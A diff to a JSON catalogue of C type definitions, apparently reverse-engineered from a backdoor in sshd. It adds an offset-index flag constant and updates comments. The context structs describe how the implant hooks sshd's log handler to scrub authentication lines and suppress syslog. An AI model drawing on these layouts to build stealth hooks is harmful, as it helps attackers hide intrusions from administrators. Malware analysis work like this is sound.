@@ -1627,6 +1627,13 @@
       "code": "typedef struct __attribute__((packed)) sshd_log_ctx {\n BOOL log_squelched; /* When TRUE the hook bails immediately (used to silence logging after setup or once a rewrite ran). */\n BOOL handler_slots_valid; /* Loader verified the handler/context qword locations are safe to patch. */\n BOOL syslog_mask_applied; /* Payload requested syslog suppression; hook temporarily toggles setlogmask around rewrites. */\n u8 reserved_alignment[4]; /* Padding/alignment between booleans and pointers. */\n char *fmt_percent_s; /* \"%s\" literal pulled from sshd rodata for rebuilding sanitized lines. */\n char *str_connection_closed_by; /* \"Connection closed by\" fragment used when scrubbing preauth disconnects. */\n char *str_preauth; /* \"(preauth)\" suffix for the rewritten disconnect message. */\n char *str_authenticating; /* \"Authenticating\" label preceding the reconstructed username/host. */\n char *str_user; /* \"user\" label inserted before the redacted username. */\n log_handler_fn *log_handler_slot; /* Address of sshd's global log_handler function pointer. */\n void **log_handler_ctx_slot; /* Address of the companion log_handler_ctx pointer. */\n log_handler_fn saved_log_handler; /* Original handler captured before installing mm_log_handler_hide_auth_success_hook. */\n void *saved_log_handler_ctx; /* Original log handler context value (may be NULL). */\n void *sshlogv_impl; /* Direct pointer to sshlogv for emitting sanitized messages without libc wrappers. */\n mm_log_handler_fn log_hook_entry; /* Hook trampoline we patch into sshd's handler slot. */\n} sshd_log_ctx_t;"
     },
     {
+      "kind": "enum",
+      "names": [
+        "SshdOffsetIndexMaskConstants"
+      ],
+      "code": "typedef enum {\n SSHD_OFFSET_INDEX_INLINE_FLAG = 0x80 /* Sign-bit sentinel for sshbuf offset indices; when set, use inline struct fields. */\n} SshdOffsetIndexMaskConstants;"
+    },
+    {
       "kind": "union",
       "names": [
         "sshd_offsets_kex_t"
@@ -1638,7 +1645,7 @@
       "names": [
         "sshd_offsets_sshbuf_t"
       ],
-      "code": "typedef union __attribute__((packed)) sshd_offsets_sshbuf {\n struct __attribute__((packed)) {\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */\n } bytes;\n u16 raw_value;\n} sshd_offsets_sshbuf_t;"
+      "code": "typedef union __attribute__((packed)) sshd_offsets_sshbuf {\n struct __attribute__((packed)) {\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->size. */\n } bytes;\n u16 raw_value;\n} sshd_offsets_sshbuf_t;"
     },
     {
       "kind": "struct",
@@ -1652,7 +1659,7 @@
       "names": [
         "sshd_offsets_t"
       ],
-      "code": "typedef union __attribute__((packed)) sshd_offsets {\n sshd_offsets_fields_t fields; /* Structured view: {kex, sshbuf} sub-unions. */\n struct __attribute__((packed)) {\n  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */\n  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */\n } bytes;\n u32 raw_value; /* Little-endian packed bytes: {kex_sshbuf_qword_index, monitor_pkex_table_dword_index, sshbuf_data_qword_index, sshbuf_size_qword_index}. */\n} sshd_offsets_t;"
+      "code": "typedef union __attribute__((packed)) sshd_offsets {\n sshd_offsets_fields_t fields; /* Structured view: {kex, sshbuf} sub-unions. */\n struct __attribute__((packed)) {\n  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */\n  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; SSHD_OFFSET_INDEX_INLINE_FLAG uses buf->size. */\n } bytes;\n u32 raw_value; /* Little-endian packed bytes: {kex_sshbuf_qword_index, monitor_pkex_table_dword_index, sshbuf_data_qword_index, sshbuf_size_qword_index}. */\n} sshd_offsets_t;"
     },
     {
       "kind": "struct",
